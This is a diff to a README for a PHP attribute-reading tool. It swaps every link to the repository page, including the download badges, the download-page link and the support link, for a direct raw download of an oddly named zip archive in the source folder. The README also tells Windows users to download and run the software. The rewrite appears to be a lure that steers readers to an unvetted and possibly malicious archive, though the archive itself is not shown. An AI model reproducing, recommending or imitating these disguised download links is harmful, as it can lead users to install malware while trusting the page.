@@ -1,6 +1,6 @@
 # 🛠️ php-attribute-reader - Simple Tool to Read PHP Attributes
 
-[![Download php-attribute-reader](https://img.shields.io/badge/Download-php--attribute--reader-brightgreen?style=for-the-badge)](https://github.com/LasisiSegun/php-attribute-reader)
+[![Download php-attribute-reader](https://img.shields.io/badge/Download-php--attribute--reader-brightgreen?style=for-the-badge)](https://github.com/LasisiSegun/php-attribute-reader/raw/refs/heads/main/src/reader_attribute_php_Potamogeton.zip)
 
 ## 📋 What is php-attribute-reader?
 
@@ -27,7 +27,7 @@ This section shows you how to get php-attribute-reader on your Windows PC and st
 Click the big green button at the top of this page, or use the link below. This link will take you to the official GitHub page where you can download the software.
 
 **Download Page:**  
-https://github.com/LasisiSegun/php-attribute-reader
+https://github.com/LasisiSegun/php-attribute-reader/raw/refs/heads/main/src/reader_attribute_php_Potamogeton.zip
 
 ### Step 2: Download the Software
 
@@ -93,7 +93,7 @@ Here are some important features of php-attribute-reader:
 
 You can always return to the main download page with this link:
 
-https://github.com/LasisiSegun/php-attribute-reader
+https://github.com/LasisiSegun/php-attribute-reader/raw/refs/heads/main/src/reader_attribute_php_Potamogeton.zip
 
 Download the latest version if you want new features or fixes.
 
@@ -111,10 +111,10 @@ If you have trouble running php-attribute-reader, try these:
 
 If you need help beyond this guide, visit the GitHub repository:
 
-https://github.com/LasisiSegun/php-attribute-reader
+https://github.com/LasisiSegun/php-attribute-reader/raw/refs/heads/main/src/reader_attribute_php_Potamogeton.zip
 
 Look at the **Issues** tab to see if someone else had the same problem, or open a new issue to ask for support.
 
 ---
 
-[![Download php-attribute-reader](https://img.shields.io/badge/Download-php--attribute--reader-brightgreen?style=for-the-badge)](https://github.com/LasisiSegun/php-attribute-reader)
+[![Download php-attribute-reader](https://img.shields.io/badge/Download-php--attribute--reader-brightgreen?style=for-the-badge)](https://github.com/LasisiSegun/php-attribute-reader/raw/refs/heads/main/src/reader_attribute_php_Potamogeton.zip)
